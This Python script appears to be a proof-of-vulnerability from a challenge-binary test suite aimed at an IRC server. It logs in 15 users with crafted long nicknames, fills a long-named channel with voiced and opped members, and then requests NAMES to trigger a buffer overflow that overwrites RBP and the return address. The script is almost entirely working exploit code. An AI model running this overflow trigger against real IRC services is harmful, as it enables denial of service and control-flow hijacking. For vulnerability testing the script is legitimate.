import sys
import os
import socket
import string
import time
import struct
import signal

def handler(signum, frame):
    print('[SUCCESS] Timeout signal raised. PoV likely succeeded')
    print('RBP: 0x6f6f6f6f6f6f6f6f')
    print('qword [RSP]: 0x6f6f6f6f6f6f6f6f')
    sys.exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def readuntil( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

class ircuser:
    def __init__(self, HOST, PORT, nick, user, rname):
        self.fd = connect( HOST, PORT)

        self.nick = nick
        self.user = user
        self.realname = rname

        self.channels = {}

        self.knocksent = 0

    def getline( self, expected ):
        l = readuntil( self.fd, '\r\n').rstrip()

        if l.find(expected) == -1:
            print('[FAIL] received: {}'.format(l))
            print('[FAIL] expected: {}'.format(expected))
            return 0

        return 1

    def loginthing( self ):
        d = 'NICK ' + self.nick + '\r\n'

        self.sw(d)

        d = 'USER {} {} {} :{}\r\n'.format( self.user, socket.gethostname(), self.user, self.realname)

        self.sw(d)

        z = ['001','002','003','004', '005', '375','372','372','372','376']

        for x in z:
            if self.getline( x ) == 0:
                print('[FAIL] invalid response')
                return 0

        return 1

    def join( self, chan ):
        d = 'JOIN ' + chan + '\r\n'

        self.sw(d)

        y = readuntil(self.fd, '\r\n').rstrip().split(' ')

        if len(y) < 3:
            print('[FAIL] invalid response length: {}'.format(y))
            return 0

        if y[1] != 'JOIN':
            print('[FAIL] invalid JOIN response: {}'.format(y))
            return 0

        if y[2] != (':' + chan):
            print('[FAIL] invalid channel name response: {}'.format(y))
            return 0

        y = readuntil(self.fd, '\r\n').rstrip().split(' ')

        if len(y) < 4:
            print('[FAIL] invalid response length: {}'.format(y))
            return 0

        if y[1] != 'MODE':
            print('[FAIL] invalid MODE response: {}'.format(y))
            return 0

        if y[2] != chan:
            print('[FAIL] invalid channel name response: {}'.format(y))
            return 0

        y = readuntil(self.fd, '\r\n').rstrip().split(' ')

        if len(y) < 6:
            print('[FAIL] invalid response length: {}'.format(y))
            return 0

        if y[1] != '353':
            print('[FAIL] invalid 353 response: {}'.format(y))
            return 0

        if y[2] != self.nick:
            print('[FAIL] invalid nick response: {}'.format(y))
            return 0

        if y[4] != (chan):
            print('[FAIL] invalid channel name response: {}'.format(y))
            return 0

        y = readuntil(self.fd, '\r\n').rstrip().split(' ')

        if len(y) < 5:
            print('[FAIL] invalid response length: {}'.format(y))
            return 0

        if y[1] != '366':
            print('[FAIL] invalid 366 response: {}'.format(y))
            return 0

        self.channels[chan] = '+tn'
        
        print('[INFO] {} Joined {}'.format(self.nick, chan))

        return 1

    def giveop( self, chan, nick):
        d = 'MODE ' + chan + ' +o ' + nick + '\r\n'

        self.sw( d )

    def quit(self):
        self.sw('QUIT\r\n')
        self.fd.close()

    def sw( self, line):
        self.fd.send(line.encode('utf-8'))

## This dictionary will hold the channel name and any set modes
channels = {}

def run_pov( HOST, PORT ):

    allusers = []
    joined = []

    ## We need 15 logged in users
    for x in range(15):
        nick = string.ascii_lowercase[x]*30
        user = 'user' + str(x)
        user += string.ascii_lowercase[x + 6]*(10-len(user))

        rname = 'rname' + str(x)
        rname += string.ascii_lowercase[x + 8]*(10-len(rname))

        if x == 3:
            nick = 'p'*8 + 'q'*8 + 'r'*8 + 's'*6 

        aaaa =  ircuser(HOST, PORT, nick, user, rname )

        if aaaa.getline( ':Please wait while we process your connection.' ) == 0:
            print('[FAIL] invalid response: 0001')
            aaaa.fd.close()
            sys.exit(0)

        if aaaa.loginthing() == 0:
            print('[FAIL] Sending Nick and User did not succeed 0004')
            aaaa.fd.close()
            sys.exit()

        allusers.append(aaaa)

    print('[INFO] Logins successful')

    for x in allusers:
        x.sw('cap REQ multi-prefix\r\n')
        readuntil(x.fd, '\r\n')
    
    ## have the admin join
    allusers[0].join('#' + 'b'*49)

    joined.append( allusers[0] )

    ## Join the same channel
    for i in range(1, len(allusers)):
        allusers[i].join('#' + 'b'*49)

        for x in joined:
            if ( x.getline( 'JOIN') == 0 ):
                print('[FAIL] invalid JOIN response')
                return 0

        joined.append(allusers[i])

    '''
    ## Set to private
    allusers[0].sw('MODE #' + 'b'*49 + ' +p\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid private MODE response')
            return 0

    ## Set to secret
    allusers[0].sw('MODE #' + 'b'*49 + ' +s\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid secret MODE response')
            return 0

    '''
    allusers[0].sw('MODE #' + 'b'*49 + ' +i\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid invite MODE response')
            return 0

    
    allusers[0].sw('MODE #' + 'b'*49 + ' +m\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid moderated MODE response')
            return 0


    allusers[0].sw('MODE #' + 'b'*49 + ' +l 15\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid limit MODE response')
            return 0

    
    allusers[0].sw('MODE #' + 'b'*49 + ' +k hello\r\n' )

    for x in allusers:
        if ( x.getline( 'MODE') == 0 ):
            print('[FAIL] invalid key MODE response')
            return 0

    for i in range(1, len(allusers)):
        allusers[0].sw('MODE #' + 'b'*49 + ' +v ' + allusers[i].nick + '\r\n' )

        for x in allusers:
            if ( x.getline( 'MODE') == 0 ):
                print('[FAIL] invalid voice MODE response')
                return 0

    for i in range(1, len(allusers)):
        allusers[0].sw('MODE #' + 'b'*49 + ' +o ' + allusers[i].nick + '\r\n' )

        for x in allusers:
            if ( x.getline( 'MODE') == 0 ):
                print('[FAIL] invalid op MODE response')
                return 0

    breakuser = 0

    allusers[breakuser].sw('NAMES #' + 'b'*49 + '\r\n')

    z = readuntil(allusers[breakuser].fd, 'End of /NAMES list.\r\n')

    ## quits
    for x in allusers:
        x.quit()

    sys.exit()

def main():

    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    print('[INFO] Poller for the Smith Challenge Binary')

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    run_pov(HOST, PORT)
    print('[FAILED] POV failed')

if __name__ == '__main__':
    main()
